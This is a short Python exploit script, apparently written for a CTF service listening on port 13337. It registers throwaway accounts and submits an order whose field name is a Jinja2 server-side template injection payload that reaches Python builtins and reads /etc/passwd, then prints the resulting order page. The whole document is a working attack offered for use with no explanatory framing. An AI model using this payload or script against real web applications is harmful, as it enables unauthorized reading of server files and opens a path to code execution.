#!/usr/bin/env python3
import sys
import re
import requests
import string
import random

host = sys.argv[1]

url = f'http://{host}:13337'


r = requests.get(url + '/clowns')
usernames = re.findall(r'<h7>([^<]*)</h7>', r.text)

payload = '''{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}'''
random_string = lambda: ''.join(random.choice(string.ascii_letters) for _ in range(16))

for username in usernames:
    s = requests.Session()
    creds = {
        'username': random_string(),
        'password': random_string()
    }
    s.post(url + '/register', data=creds)
    s.post(url + '/login', data=creds)
    s.post(url + '/new_order', data={
        payload: 'lolkekcheburek'
    })
    r = s.get(url + '/profile')
    orders = re.findall(r'\<a href\=\"\/order\/.*\"\>([a-f0-9]*)\<\/a\>\<br\/\>', r.text)
    r = s.get(url + '/order/' + orders[0])
    print(r.text)

